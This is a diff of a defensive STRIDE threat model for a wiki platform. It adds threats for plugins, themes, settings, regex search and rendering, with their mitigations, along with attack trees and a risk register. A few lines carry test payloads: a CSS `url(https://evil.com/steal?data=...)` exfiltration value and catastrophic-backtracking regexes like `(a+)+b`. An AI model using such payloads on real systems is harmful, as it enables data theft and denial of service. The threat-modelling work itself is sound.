+| **Mitigation** | Enforce WSS (WebSocket Secure) only; validate WebSocket origin header; authenticate WebSocket connections via session token; encrypt sensitive data in WebSocket messages if needed; Yjs sync protocol does not transmit raw content in plaintext |
 | **Verification** | Attempt WS (non-TLS) connection; verify rejected; verify auth required for WebSocket upgrade |
+
+### 7.9 Threat I-09: Plugin Data Exfiltration (New)
+
+| Field | Value |
+|-------|-------|
+| **Threat ID** | I-09 |
+| **Description** | Malicious plugin reads user data (pages, annotations, settings) via the Plugin API and exfiltrates it to an external server |
+| **Affected Component** | PluginAPI (pluginSandbox.ts, lifecycleHooks.ts) |
+| **Affected Site** | SHARED |
+| **Trust Boundary Crossed** | TB5.5 (Web Worker Sandbox), TB4 (Client-Server) |
+| **CVSS 3.1** | **7.5 (High)** — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N |
+| **OWASP Top 10** | A01:2021 — Broken Access Control, A05:2021 — Security Misconfiguration |
+| **NIST SP 800-53** | AC-3, AC-4, SC-7 |
+| **Mitigation** | Plugin network access restricted to declared capabilities (`network:fetch`); fetch requests proxied through host with URL allowlist; plugin cannot access cookies, localStorage, or sessionStorage directly; data returned to plugin is scoped to requested capabilities; CSP connect-src limits outbound connections |
+| **Verification** | Grant plugin `read:pages` capability; verify plugin cannot access annotations; attempt network exfiltration without `network:fetch`; verify blocked; monitor outbound requests from plugin Worker |
+
+### 7.10 Threat I-10: Theme Data Exfiltration via CSS (New)
+
+| Field | Value |
+|-------|-------|
+| **Threat ID** | I-10 |
+| **Description** | Malicious theme uses CSS to exfiltrate data by reading input values via attribute selectors or loading external resources that encode data in the URL |
+| **Affected Component** | ThemeEngine (themeEngine.ts) |
+| **Affected Site** | SHARED |
+| **Trust Boundary Crossed** | TB5.6 (CSS OM) |
+| **CVSS 3.1** | **5.3 (Medium)** — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N |
+| **OWASP Top 10** | A03:2021 — Injection |
+| **NIST SP 800-53** | SI-10, SC-7 |
+| **Mitigation** | Theme tokens restricted to color values, font stacks, and CSS lengths; no `url()` function allowed in token values; CSP img-src restricts image loading origins; theme CSS applied via `<link>` with integrity hash; automated CSS analysis on marketplace upload |
+| **Verification** | Submit theme with `background: url(https://evil.com/steal?data=...)`; verify rejected by Zod schema; test CSS attribute selector data exfiltration; verify mitigated by CSP |
+
+### 7.11 Threat I-11: Settings Export Data Leakage (New)
+
+| Field | Value |
+|-------|-------|
+| **Threat ID** | I-11 |
+| **Description** | Settings export includes sensitive data (session tokens, API keys, auth configuration) that should not be shared |
+| **Affected Component** | SettingsManager (settingsExporter.ts) |
+| **Affected Site** | WIKI |
+| **Trust Boundary Crossed** | TB5.1 (Browser DOM) |
+| **CVSS 3.1** | **5.3 (Medium)** — AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:N/A:N |
+| **OWASP Top 10** | A04:2021 — Insecure Design |
+| **NIST SP 800-53** | AC-6, SC-8 |
+| **Mitigation** | Export includes only user-configurable settings (theme, shortcuts, display preferences); security-critical settings excluded from export; export explicitly marked as non-sensitive in schema; sensitive fields stripped before serialization |
+| **Verification** | Export settings; verify no tokens, API keys, or auth config in output; verify export file contains only UI preferences |
 
 ---
 
@@ -685,6 +888,7 @@ Denial of service threats involve making the system unavailable to legitimate us
 | **Description** | Attacker sends excessive D1 queries (via API endpoints) to exhaust the daily row-read quota, causing service denial |
 | **Affected Component** | D1 Database, API routes |
 | **Affected Site** | WIKI |
+| **Trust Boundary Crossed** | TB3.1 (D1 Database) |
 | **CVSS 3.1** | **6.5 (Medium)** — AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H |
 | **OWASP Top 10** | A05:2021 — Security Misconfiguration |
 | **NIST SP 800-53** | SC-5, SI-4 |
@@ -699,6 +903,7 @@ Denial of service threats involve making the system unavailable to legitimate us
 | **Description** | Attacker floods KV with write requests to exhaust the write quota or fill storage, causing cache failures |
 | **Affected Component** | KV Namespaces |
 | **Affected Site** | SHARED |
+| **Trust Boundary Crossed** | TB3.2 (KV Namespace) |
 | **CVSS 3.1** | **5.3 (Medium)** — AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L |
 | **OWASP Top 10** | A05:2021 — Security Misconfiguration |
 | **NIST SP 800-53** | SC-5 |
@@ -713,6 +918,7 @@ Denial of service threats involve making the system unavailable to legitimate us
 | **Description** | Attacker opens many concurrent WebSocket connections to Durable Objects to exhaust connection limits or CPU time |
 | **Affected Component** | Durable Objects (WikiRoom) |
 | **Affected Site** | WIKI |
+| **Trust Boundary Crossed** | TB2.3 (Durable Objects) |
 | **CVSS 3.1** | **6.5 (Medium)** — AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H |
 | **OWASP Top 10** | A05:2021 — Security Misconfiguration |
 | **NIST SP 800-53** | SC-5, SI-4 |
@@ -727,6 +933,7 @@ Denial of service threats involve making the system unavailable to legitimate us
 | **Description** | Attacker uploads large files repeatedly to exhaust R2 storage quota |
 | **Affected Component** | R2 Bucket, File upload endpoint |
 | **Affected Site** | WIKI |
+| **Trust Boundary Crossed** | TB3.3 (R2 Bucket) |
 | **CVSS 3.1** | **5.3 (Medium)** — AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L |
 | **OWASP Top 10** | A04:2021 — Insecure Design |
 | **NIST SP 800-53** | SC-5, SC-6 |
@@ -741,11 +948,72 @@ Denial of service threats involve making the system unavailable to legitimate us
 | **Description** | Attacker sends requests that trigger CPU-intensive operations in Workers (complex search queries, large file processing) to exhaust CPU time quota |
 | **Affected Component** | Cloudflare Workers |
 | **Affected Site** | SHARED |
+| **Trust Boundary Crossed** | TB2.2 (Workers) |
 | **CVSS 3.1** | **5.3 (Medium)** — AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L |
 | **OWASP Top 10** | A05:2021 — Security Misconfiguration |
 | **NIST SP 800-53** | SC-5, SI-4 |
 | **Mitigation** | Set CPU time limits per request; implement query complexity limits; cache expensive computations; monitor Worker CPU usage; implement request timeout (50ms CPU limit) |
 | **Verification** | Submit complex query; verify CPU time limit enforced; verify timeout returns 504 |
+
+### 8.7 Threat D-07: ReDoS in Regex Search (New)
+
+| Field | Value |
+|-------|-------|
+| **Threat ID** | D-07 |
+| **Description** | Attacker inputs a crafted regex pattern that causes catastrophic backtracking in the RegExp engine, freezing the browser tab and causing denial of service |
+| **Affected Component** | RegexSearch (regexSearch.ts, redos-analyzer.ts) |
+| **Affected Site** | SHARED |
+| **Trust Boundary Crossed** | TB5.7 (RegExp Engine) |
+| **CVSS 3.1** | **7.5 (High)** — AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H |
+| **OWASP Top 10** | A06:2021 — Vulnerable and Outdated Components, A05:2021 — Security Misconfiguration |
+| **NIST SP 800-53** | SC-5, SI-10 |
+| **Mitigation** | 4-layer ReDoS defense: (1) pattern length limit (256 chars); (2) complexity analysis via redos-analyzer (detect nested quantifiers, overlapping alternations); (3) execution timeout (100ms) via AbortController or Web Worker with timeout; (4) fallback to linear scan on timeout; patterns with complexity score above threshold rejected with user-friendly error |
+| **Verification** | Submit known ReDoS patterns: `(a+)+b`, `(a|a)+b`, `(a|ab)+c`; verify timeout enforced within 100ms; verify UI remains responsive; fuzz with automated ReDoS pattern generator |
+
+### 8.8 Threat D-08: Graph View Data Exhaustion (New)
+
+| Field | Value |
+|-------|-------|
+| **Threat ID** | D-08 |
+| **Description** | Attacker manipulates graph data to create extremely large graphs that exhaust browser memory or cause rendering lag |
+| **Affected Component** | GraphView (graph-builder.ts, force-directed layout) |
+| **Affected Site** | SHARED |
+| **Trust Boundary Crossed** | TB5.1 (Browser DOM) |
+| **CVSS 3.1** | **5.3 (Medium)** — AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L |
+| **OWASP Top 10** | A04:2021 — Insecure Design |
+| **NIST SP 800-53** | SC-6, SI-10 |
+| **Mitigation** | Node count hard cap (500 nodes max); edge count limit (2000 edges); graph.json generated at build time from curated content (not user input); force-directed simulation bounded to 300 iterations; virtual rendering for visible nodes only |
+| **Verification** | Attempt to load graph with >500 nodes; verify truncation; measure memory usage with max-size graph; verify within budget |
+
+### 8.9 Threat D-09: LaTeX Expression Exhaustion (New)
+
+| Field | Value |
+|-------|-------|
+| **Threat ID** | D-09 |
+| **Description** | Attacker crafts extremely complex LaTeX expressions that cause KaTeX rendering to consume excessive CPU or memory |
+| **Affected Component** | LaTeXRenderer (katex-ssr.ts, LatexIsland.tsx) |
+| **Affected Site** | SHARED |
+| **Trust Boundary Crossed** | TB5.1 (Browser DOM) |
+| **CVSS 3.1** | **5.3 (Medium)** — AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:L |
+| **OWASP Top 10** | A04:2021 — Insecure Design |
+| **NIST SP 800-53** | SC-6, SI-10 |
+| **Mitigation** | Expression length limit (1000 characters); KaTeX rendering timeout (500ms); SSR renders at build time (no runtime cost); CSR fallback uses Web Worker with timeout; malformed expressions fail gracefully with error message |
+| **Verification** | Submit 1000+ character expression; verify truncated or rejected; submit deeply nested expression; verify timeout enforced; measure render time for complex expressions |
+
+### 8.10 Threat D-10: Plugin Resource Exhaustion (New)
+
+| Field | Value |
+|-------|-------|
+| **Threat ID** | D-10 |
+| **Description** | Malicious or poorly written plugin exhausts Worker CPU time, memory, or message queue, degrading performance for all users |
+| **Affected Component** | PluginAPI (pluginSandbox.ts) |
+| **Affected Site** | SHARED |
+| **Trust Boundary Crossed** | TB5.5 (Web Worker Sandbox) |
+| **CVSS 3.1** | **6.5 (Medium)** — AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:H |
+| **OWASP Top 10** | A04:2021 — Insecure Design |
+| **NIST SP 800-53** | SC-5, SC-6 |
+| **Mitigation** | Per-plugin CPU time limit (50ms per message); per-plugin memory limit (16MB); message queue depth limit (100 pending messages); plugin crash does not affect host (try/catch around postMessage handler); plugin timeout kills Worker and notifies user |
+| **Verification** | Install plugin with infinite loop; verify timeout kills Worker; install plugin with memory leak; verify memory limit enforced; verify host continues unaffected |
 
 ---
 
@@ -759,7 +1027,7 @@ Elevation of privilege threats involve an attacker gaining higher access than au
 |-------|-------|
 | **Threat ID** | E-01 |
 | **Description** | Attacker escalates from regular contributor to moderator/admin role by exploiting RBAC implementation flaws |
-| **Affected Component** | AuthService (auth/rbac.ts), ModerationService |
+| **Affected Component** | AuthService (auth/rbac.ts), ModerationService, RBACEnforcer |
 | **Affected Site** | WIKI |
 | **Trust Boundary Crossed** | TB2.2 (Workers) |
 | **CVSS 3.1** | **8.8 (Critical)** — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
@@ -776,6 +1044,7 @@ Elevation of privilege threats involve an attacker gaining higher access than au
 | **Description** | Attacker exploits admin functionality (user management) to impersonate another user or grant themselves elevated privileges |
 | **Affected Component** | AuthService, User Management API |
 | **Affected Site** | WIKI |
+| **Trust Boundary Crossed** | TB2.2 (Workers) |
 | **CVSS 3.1** | **8.8 (Critical)** — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
 | **OWASP Top 10** | A01:2021 — Broken Access Control |
 | **NIST SP 800-53** | AC-2, AC-3, AC-6, AU-2 |
@@ -857,6 +1126,51 @@ Elevation of privilege threats involve an attacker gaining higher access than au
 | **Mitigation** | OAuth account linking requires current session authentication; confirm linking with user via email; prevent linking to already-linked accounts; audit account linking events |
 | **Verification** | Attempt to link OAuth without active session; verify rejected; attempt to link already-linked account; verify rejected |
 
+### 9.8 Threat E-08: Plugin Capability Escalation (New)
+
+| Field | Value |
+|-------|-------|
+| **Threat ID** | E-08 |
+| **Description** | Attacker manipulates plugin manifest or postMessage interface to gain capabilities beyond what was approved (e.g., upgrading from `read:pages` to `write:pages`) |
+| **Affected Component** | PluginAPI (capabilityMatrix.ts, pluginSandbox.ts) |
+| **Affected Site** | SHARED |
+| **Trust Boundary Crossed** | TB5.5 (Web Worker Sandbox), TB4 (Client-Server) |
+| **CVSS 3.1** | **8.5 (High)** — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N |
+| **OWASP Top 10** | A01:2021 — Broken Access Control |
+| **NIST SP 800-53** | AC-3, AC-6 |
+| **Mitigation** | Capabilities validated on every API call (not just at install); manifest capabilities are immutable after install; postMessage protocol includes capability token per request; host-side validation of all capability claims; plugin cannot self-modify capabilities; capability grants logged |
+| **Verification** | Modify plugin code post-install to request additional capabilities; verify rejected; forge postMessage with elevated capability; verify host-side validation rejects; audit capability grant logs |
+
+### 9.9 Threat E-09: Theme Privilege Escalation (New)
+
+| Field | Value |
+|-------|-------|
+| **Threat ID** | E-09 |
+| **Description** | Attacker creates a theme that overrides security-critical CSS (CSP-related styles, form styling, focus indicators) to facilitate phishing or UI redress attacks |
+| **Affected Component** | ThemeEngine (themeInheritance.ts) |
+| **Affected Site** | SHARED |
+| **Trust Boundary Crossed** | TB5.6 (CSS OM), TB5.1 (Browser DOM) |
+| **CVSS 3.1** | **6.5 (Medium)** — AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:L/A:N |
+| **OWASP Top 10** | A07:2021 — Identification and Authentication Failures |
+| **NIST SP 800-53** | AC-3, SI-15 |
+| **Mitigation** | Theme tokens restricted to visual properties only (colors, fonts, spacing); critical CSS (focus indicators, form styling) not overridable by themes; CSP style-src uses nonce for inline styles; theme cannot modify `position: fixed` elements (prevents overlay phishing); automated UI regression testing for security-critical elements |
+| **Verification** | Submit theme that overrides focus indicator styles; verify blocked; submit theme that positions overlay on login button; verify rejected by token schema; test phishing overlay scenario |
+
+### 9.10 Threat E-10: Settings Manipulation for Security Bypass (New)
+
+| Field | Value |
+|-------|-------|
+| **Threat ID** | E-10 |
+| **Description** | Attacker modifies settings to bypass security controls (e.g., disabling CSP, altering auth configuration, modifying rate limits) |
+| **Affected Component** | SettingsManager (settingsValidator.ts, settingsStorage.ts) |
+| **Affected Site** | WIKI |
+| **Trust Boundary Crossed** | TB5.1 (Browser DOM), TB5.2 (localStorage) |
+| **CVSS 3.1** | **7.5 (High)** — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N |
+| **OWASP Top 10** | A05:2021 — Security Misconfiguration |
+| **NIST SP 800-53** | CM-6, CM-7 |
+| **Mitigation** | Security-critical settings (CSP, auth, rate limits) stored server-side in D1, not client-side; client settings limited to UI preferences (theme, shortcuts, display); settings schema explicitly separates server-only vs client-configurable fields; import validation rejects server-only field overrides |
+| **Verification** | Attempt to modify CSP settings via client; verify server-side override; attempt to import settings with auth config changes; verify rejected by schema validation; verify server-only fields stripped on import |
+
 ---
 
 ## 10. Attack Trees
@@ -869,7 +1183,9 @@ ROOT GOAL: Steal user session token
 │   ├── Step 1.1: Find XSS vulnerability
 │   │   ├── 1.1.1: Test wiki content for script injection
 │   │   ├── 1.1.2: Test annotation content for script injection
-│   │   └── 1.1.3: Test search parameters for reflected XSS
+│   │   ├── 1.1.3: Test search parameters for reflected XSS
+│   │   ├── 1.1.4: Test MDX editor output for stored XSS (NEW)
+│   │   └── 1.1.5: Test comment body for stored XSS (NEW)
 │   ├── Step 1.2: Inject script to read cookies
 │   │   └── Requirement: Cookie must not be HttpOnly
 │   └── Step 1.3: Exfiltrate token to attacker server
@@ -884,11 +1200,18 @@ ROOT GOAL: Steal user session token
 │   │   ├── 3.1.1: Check localStorage for token
 │   │   └── 3.1.2: Check browser dev tools
 │   └── Mitigation: HttpOnly cookies, short token lifetime
-└── Method 4: Social Engineering
-    ├── Step 4.1: Phish victim into clicking malicious link
-    │   └── Mitigation: CSP, SameSite cookies
-    └── Step 4.2: Trick victim into pasting token
-        └── Mitigation: Never expose token to user
+├── Method 4: Social Engineering
+│   ├── Step 4.1: Phish victim into clicking malicious link
+│   │   └── Mitigation: CSP, SameSite cookies
+│   └── Step 4.2: Trick victim into pasting token
+│       └── Mitigation: Never expose token to user
+└── Method 5: Plugin Exfiltration (NEW)
+    ├── Step 5.1: Publish malicious plugin
+    │   └── Mitigation: Plugin sandbox, capability matrix
+    ├── Step 5.2: Plugin reads user data via API
+    │   └── Mitigation: Capability-gated data access
+    └── Step 5.3: Plugin exfiltrates via network
+        └── Mitigation: network:fetch capability required, URL allowlist
 ```
 
 ### 10.2 Attack Tree: Inject Malicious Wiki Content
@@ -902,7 +1225,8 @@ ROOT GOAL: Inject malicious content into wiki pages
 │   ├── Step 1.2: Submit edit with XSS payload
 │   │   ├── 1.2.1: Test MDX sanitization bypass
 │   │   ├── 1.2.2: Test DOMPurify configuration
-│   │   └── 1.2.3: Test CSP nonce bypass
+│   │   ├── 1.2.3: Test CSP nonce bypass
+│   │   └── 1.2.4: Test MDX editor JSX component injection (NEW)
 │   └── Step 1.3: Wait for moderation approval
 │       └── Mitigation: Moderation queue for new users
 ├── Method 2: CSRF Attack
@@ -910,11 +1234,18 @@ ROOT GOAL: Inject malicious content into wiki pages
 │   │   └── Mitigation: CSRF token, SameSite cookie
 │   └── Step 2.2: Trick authenticated user into visiting
 │       └── Mitigation: Origin validation
-└── Method 3: Durable Object Injection
-    ├── Step 3.1: Connect to WikiRoom WebSocket
-    │   └── Mitigation: WebSocket authentication required
-    └── Step 3.2: Send edit message with XSS payload
-        └── Mitigation: Server-side content sanitization
+├── Method 3: Durable Object Injection
+│   ├── Step 3.1: Connect to WikiRoom WebSocket
+│   │   └── Mitigation: WebSocket authentication required
+│   └── Step 3.2: Send edit message with XSS payload
+│       └── Mitigation: Server-side content sanitization
+└── Method 4: Comment/Annotation Injection (NEW)
+    ├── Step 4.1: Submit comment with XSS payload
+    │   └── Mitigation: DOMPurify sanitization
+    ├── Step 4.2: Create annotation with script injection
+    │   └── Mitigation: W3C structured body, DOMPurify
+    └── Step 4.3: Giscus bypass for custom comments
+        └── Mitigation: JWT verification on custom store
 ```
 
 ### 10.3 Attack Tree: Escalate to Admin Role
@@ -938,11 +1269,18 @@ ROOT GOAL: Gain admin privileges
 │   │   └── Mitigation: OAuth ID token validation
 │   └── Step 3.2: Use compromised OAuth to login as admin
 │       └── Mitigation: Multi-factor auth for admin accounts
-└── Method 4: Database Manipulation
-    ├── Step 4.1: Find SQL injection in user management
-    │   └── Mitigation: Parameterized queries
-    └── Step 4.2: Update user role directly in D1
-        └── Mitigation: Parameterized queries, input validation
+├── Method 4: Database Manipulation
+│   ├── Step 4.1: Find SQL injection in user management
+│   │   └── Mitigation: Parameterized queries
+│   └── Step 4.2: Update user role directly in D1
+│       └── Mitigation: Parameterized queries, input validation
+└── Method 5: Plugin Capability Escalation (NEW)
+    ├── Step 5.1: Install plugin with broad capabilities
+    │   └── Mitigation: Minimal capability grants
+    ├── Step 5.2: Exploit plugin sandbox escape
+    │   └── Mitigation: Web Worker isolation
+    └── Step 5.3: Use escaped plugin to modify user roles
+        └── Mitigation: Server-side RBAC, capability matrix
 ```
 
 ---
@@ -954,17 +1292,17 @@ ROOT GOAL: Gain admin privileges
 ```
 [Attacker] --> [Find Entry Point]
                     |
-        +-----------+-----------+
-        |           |           |
-   [Wiki Edit]  [Annotation]  [WebSocket]
-        |           |           |
-        v           v           v
-   [Inject XSS] [Inject XSS] [Inject Edit]
-        |           |           |
-        v           v           v
-   [Bypass Sanitizer] [Bypass Sanitizer] [Bypass Auth]
-        |           |           |
-        +-----------+-----------+
+        +-----------+-----------+-----------+
+        |           |           |           |
+   [Wiki Edit]  [Annotation]  [WebSocket] [MDX Editor] (NEW)
+        |           |           |           |
+        v           v           v           v
+   [Inject XSS] [Inject XSS] [Inject Edit] [Inject JSX]
+        |           |           |           |
+        v           v           v           v
+   [Bypass Sanitizer] [Bypass Sanitizer] [Bypass Auth] [Bypass MDX Whitelist]
+        |           |           |           |
+        +-----------+-----------+-----------+
                     |
                     v
             [Execute in Browser]
@@ -977,58 +1315,61 @@ ROOT GOAL: Gain admin privileges
    [Impersonate] [Vandalism] [Phishing]
 ```
 
-### 11.2 Attack Graph: Authentication Bypass Path
+### 11.2 Attack Graph: Plugin Sandbox Escape Path (NEW)
 
 ```
-[Attacker] --> [Target: wikipept.com Account]
+[Attacker] --> [Publish Malicious Plugin]
                     |
         +-----------+-----------+
         |           |           |
-   [JWT Forgery] [Session Theft] [OAuth Bypass]
+   [Malicious   [Manifest   [Dependency
+    Code]        Forgery]    Confusion]
         |           |           |
         v           v           v
-   [Forge Token] [XSS/Network] [State Manipulation]
+   [Execute in  [Escalate   [Install
+    Worker]      Capabilities] Malicious Dep]
         |           |           |
         v           v           v
-   [Test Token] [Read Cookie] [Forge Callback]
-        |           |           |
-        v           v           v
-   [Bypass Verify] [Exfiltrate] [Link Account]
+   [Access postMessage] [Forge Requests] [Access Host APIs]
         |           |           |
         +-----------+-----------+
                     |
                     v
-            [Authenticated as Victim]
+            [Data Exfiltration or DOM Manipulation]
                     |
         +-----------+-----------+
         |           |           |
-   [Read Data] [Modify Data] [Admin Actions]
+   [Read User   [Modify UI] [Steal Session
+    Data]                    Token]
 ```
 
-### 11.3 Attack Graph: Privilege Escalation Path
+### 11.3 Attack Graph: ReDoS Attack Path (NEW)
 
 ```
-[Attacker] --> [Initial Access: Contributor Role]
+[Attacker] --> [Open Regex Search]
                     |
         +-----------+-----------+
         |           |           |
-   [RBAC Bypass] [Role Manipulation] [Reputation Gaming]
+   [Craft ReDoS  [Nested      [Overlapping
+    Pattern]      Quantifiers]  Alternations]
         |           |           |
         v           v           v
-   [Access Admin] [Direct Update] [Self-Edit Inflation]
-   [Endpoint]     [Database]      [Sock Puppets]
-        |           |           |
-        v           v           v
-   [Gain Moderator] [Gain Admin] [Bypass Queue]
+   [Input Pattern] [Bypass     [Bypass Length
+                    Length       Limit via
+                    Limit]      Unicode]
         |           |           |
         +-----------+-----------+
                     |
                     v
-            [Elevated Privileges]
+            [Catastrophic Backtracking]
                     |
         +-----------+-----------+
         |           |           |
-   [Delete Content] [Ban Users] [Modify System]
+   [CPU 100%]  [Tab Freeze]  [Battery Drain]
+        |           |           |
+        v           v           v
+   [DoS on     [User        [Mobile Device
+    Browser]    Frustration] Overheating]
 ```
 
 ---
@@ -1046,6 +1387,8 @@ ROOT GOAL: Gain admin privileges
 | S-05 | Spoofing | 6.5 | MEDIUM | WikiService | Mitigation plan needed |
 | S-06 | Spoofing | 5.9 | MEDIUM | DNS/CDN | Cloudflare-managed |
 | S-07 | Spoofing | 3.7 | LOW | Infrastructure | Cloudflare-managed |
+| S-08 | Spoofing | 6.5 | MEDIUM | Annotations (NEW) | Required before launch |
+| S-09 | Spoofing | 6.8 | MEDIUM | Comments (NEW) | Required before launch |
 | T-01 | Tampering | 9.1 | CRITICAL | Wiki Content | Required before launch |
 | T-02 | Tampering | 8.1 | CRITICAL | Annotations | Required before launch |
 | T-03 | Tampering | 6.1 | MEDIUM | Search | Mitigation plan needed |
@@ -1055,11 +1398,18 @@ ROOT GOAL: Gain admin privileges
 | T-07 | Tampering | 3.7 | LOW | Flashcards | Accept |
 | T-08 | Tampering | 6.5 | MEDIUM | File Upload | Mitigation plan needed |
 | T-09 | Tampering | 8.0 | HIGH | CI/CD | Required before launch |
+| T-10 | Tampering | 9.1 | CRITICAL | MDX Editor (NEW) | Required before launch |
+| T-11 | Tampering | 9.0 | CRITICAL | Plugin API (NEW) | Required before launch |
+| T-12 | Tampering | 6.5 | MEDIUM | Theme Engine (NEW) | Mitigation plan needed |
+| T-13 | Tampering | 6.5 | MEDIUM | Settings Manager (NEW) | Mitigation plan needed |
+| T-14 | Tampering | 7.5 | HIGH | Service Worker (NEW) | Required before launch |
 | R-01 | Repudiation | 7.5 | HIGH | WikiService | Required before launch |
 | R-02 | Repudiation | 5.3 | MEDIUM | Moderation | Mitigation plan needed |
 | R-03 | Repudiation | 5.3 | MEDIUM | Admin Actions | Mitigation plan needed |
 | R-04 | Repudiation | 4.3 | MEDIUM | QuizService | Mitigation plan needed |
 | R-05 | Repudiation | 3.7 | LOW | AuthService | Accept |
+| R-06 | Repudiation | 5.3 | MEDIUM | Plugin API (NEW) | Mitigation plan needed |
+| R-07 | Repudiation | 5.3 | MEDIUM | Annotations (NEW) | Mitigation plan needed |
 | I-01 | Info Disclosure | 7.5 | HIGH | API Routes | Required before launch |
 | I-02 | Info Disclosure | 6.5 | MEDIUM | Leaderboard | Mitigation plan needed |
 | I-03 | Info Disclosure | 6.5 | MEDIUM | URL Design | Mitigation plan needed |
@@ -1068,12 +1418,19 @@ ROOT GOAL: Gain admin privileges
 | I-06 | Info Disclosure | 4.3 | MEDIUM | Search | Mitigation plan needed |
 | I-07 | Info Disclosure | 7.5 | HIGH | R2 Storage | Required before launch |
 | I-08 | Info Disclosure | 5.9 | MEDIUM | WebSocket | Mitigation plan needed |
+| I-09 | Info Disclosure | 7.5 | HIGH | Plugin API (NEW) | Required before launch |
+| I-10 | Info Disclosure | 5.3 | MEDIUM | Theme Engine (NEW) | Mitigation plan needed |
+| I-11 | Info Disclosure | 5.3 | MEDIUM | Settings Manager (NEW) | Mitigation plan needed |
 | D-01 | DoS | 7.5 | HIGH | Rate Limiting | Required before launch |
 | D-02 | DoS | 6.5 | MEDIUM | D1 Database | Mitigation plan needed |
 | D-03 | DoS | 5.3 | MEDIUM | KV Storage | Mitigation plan needed |
 | D-04 | DoS | 6.5 | MEDIUM | Durable Objects | Mitigation plan needed |
 | D-05 | DoS | 5.3 | MEDIUM | R2 Storage | Mitigation plan needed |
 | D-06 | DoS | 5.3 | MEDIUM | Workers | Mitigation plan needed |
+| D-07 | DoS | 7.5 | HIGH | Regex Search (NEW) | Required before launch |
+| D-08 | DoS | 5.3 | MEDIUM | Graph View (NEW) | Mitigation plan needed |
+| D-09 | DoS | 5.3 | MEDIUM | LaTeX Renderer (NEW) | Mitigation plan needed |
+| D-10 | DoS | 6.5 | MEDIUM | Plugin API (NEW) | Mitigation plan needed |
 | E-01 | EoP | 8.8 | CRITICAL | RBAC | Required before launch |
 | E-02 | EoP | 8.8 | CRITICAL | Admin API | Required before launch |
 | E-03 | EoP | 7.2 | HIGH | Durable Objects | Required before launch |
@@ -1081,14 +1438,17 @@ ROOT GOAL: Gain admin privileges
 | E-05 | EoP | 6.5 | MEDIUM | Reputation | Mitigation plan needed |
 | E-06 | EoP | 8.1 | HIGH | XSS Chain | Required before launch |
 | E-07 | EoP | 7.5 | HIGH | OAuth | Required before launch |
+| E-08 | EoP | 8.5 | HIGH | Plugin API (NEW) | Required before launch |
+| E-09 | EoP | 6.5 | MEDIUM | Theme Engine (NEW) | Mitigation plan needed |
+| E-10 | EoP | 7.5 | HIGH | Settings Manager (NEW) | Required before launch |
 
 ### 12.2 Risk Heat Map
 
 ```
 Impact
-  Critical | T-05  E-01  E-02  |
-  High     | T-01  S-01  T-02  E-06  S-03  E-07  I-01  I-04  I-07  D-01  T-09  R-01  T-04  S-02  E-03
-  Medium   | T-03  S-04  S-05  I-02  I-03  I-05  I-08  D-02  D-04  E-04  E-05  T-06  T-08  D-03  D-05  D-06  S-06  R-02  R-03  R-04  I-06
+  Critical | T-05  E-01  E-02  T-10  T-11  |
+  High     | T-01  S-01  T-02  E-06  S-03  E-07  I-01  I-04  I-07  D-01  T-09  R-01  T-04  S-02  E-03  E-08  E-10  T-14  D-07  I-09
+  Medium   | T-03  S-04  S-05  I-02  I-03  I-05  I-08  D-02  D-04  E-04  E-05  T-06  T-08  D-03  D-05  D-06  S-06  R-02  R-03  R-04  I-06  S-08  S-09  T-12  T-13  D-08  D-09  D-10  E-09  I-10  I-11  R-06  R-07
   Low      | T-07  S-07  R-05
            +--------------------------------------------------------------> Likelihood
              Low           Medium           High           Critical
@@ -1102,57 +1462,27 @@ Impact
 
 | Priority | Threats | Action | Timeline |
 |----------|---------|--------|----------|
-| P0 (Critical) | T-01, T-02, T-05, E-01, E-02 | Implement mitigations immediately | Before any deployment |
-| P1 (High) | S-01, S-02, S-03, T-04, T-09, R-01, I-01, I-04, I-07, D-01, E-03, E-06, E-07 | Implement mitigations before launch | Before production launch |
-| P2 (Medium) | S-04, S-05, S-06, T-03, T-06, T-08, R-02, R-03, R-04, I-02, I-03, I-05, I-06, I-08, D-02-D-06, E-04, E-05 | Document mitigation plan | Within 30 days of launch |
+| P0 (Critical) | T-01, T-02, T-05, T-10, T-11, E-01, E-02 | Implement mitigations immediately | Before any deployment |
+| P1 (High) | S-01, S-02, S-03, T-04, T-09, T-14, D-07, R-01, I-01, I-04, I-07, I-09, D-01, E-03, E-06, E-07, E-08, E-10 | Implement mitigations before launch | Before production launch |
+| P2 (Medium) | S-04, S-05, S-06, S-08, S-09, T-03, T-06, T-08, T-12, T-13, R-02, R-03, R-04, R-06, R-07, I-02, I-03, I-05, I-06, I-08, I-10, I-11, D-02-D-06, D-08-D-10, E-04, E-05, E-09 | Document mitigation plan | Within 30 days of launch |
 | P3 (Low) | S-07, T-07, R-05 | Accept risk or defer | Post-launch review |
 
-### 13.2 Control Mapping to NIST SP 800-53
+### 13.2 New Component Mitigation Matrix
 
-| NIST Control | Control Name | Threats Addressed | Implementation |
-|--------------|-------------|-------------------|----------------|
-| AC-2 | Account Management | S-01, S-02, E-01, E-07 | OAuth + session management |
-| AC-3 | Access Enforcement | S-05, T-01-T-06, E-01-E-07 | RBAC + server-side checks |
-| AC-5 | Separation of Duties | E-01, E-02 | Admin action audit |
-| AC-6 | Least Privilege | S-05, I-01, I-04, E-01 | DTO filtering, role restrictions |
-| AC-7 | Unsuccessful Login Attempts | R-05 | Account lockout |
-| AC-17 | Remote Access | S-01, S-02 | TLS, HSTS |
-| AU-2 | Audit Events | R-01-R-05 | Structured logging |
-| AU-3 | Content of Audit Records | R-01-R-05 | Full audit trail |
-| AU-6 | Audit Review | R-01-R-05 | Log monitoring |
